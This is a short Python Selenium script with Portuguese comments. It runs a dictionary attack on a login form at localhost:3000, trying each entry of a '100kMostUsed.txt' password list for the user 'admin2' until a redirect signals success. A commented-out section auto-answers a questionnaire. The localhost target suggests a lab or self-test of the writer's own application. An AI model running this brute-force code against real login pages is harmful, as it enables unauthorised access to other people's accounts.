from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import time
import subprocess

subprocess.run(['pip', 'install', 'selenium'])

with open('100kMostUsed.txt', 'r', encoding='utf-8') as file:
    rows = [(row.strip(), row_number) for row_number, row in enumerate(file, start=1)]

driver = webdriver.Chrome()
url = "http://localhost:3000/login"
driver.get(url)

for row, row_number in rows:
    print(row)
    try:
        if not driver.find_element(By.ID, "user"):
            break
        usernameInput = driver.find_element(By.ID, "user")

        usernameInput.send_keys("admin2")

        passwordInput = driver.find_element(By.ID, "password")
        passwordInput.send_keys(row)

        botaoLogin = driver.find_element(By.ID, 'btn-entrar')
        botaoLogin.click()
    except NoSuchElementException:
        # Se o elemento não for encontrado, significa que ocorreu um redirecionamento
        print("Redirecionamento detectado. Parando a execução.")
        break

time.sleep(20)



# wait = WebDriverWait(driver, 10)

# botaoQuestionario =wait.until(EC.visibility_of_element_located((By.ID, "btnResponderQuestionarioObg")))
# botaoQuestionario.click()

# handles = driver.window_handles
# driver.switch_to.window(handles[1])

# radio_buttons = driver.find_elements(By.CSS_SELECTOR, 'input[type="radio"]')

# for i in range(0, len(radio_buttons), 3):
#     radio_buttons[i].click()

# time.sleep(1)

# driver.find_element(By.XPATH, f'//input[@value="Submeter Respostas do Questionário"]').click()

# time.sleep(1)
# driver.quit()
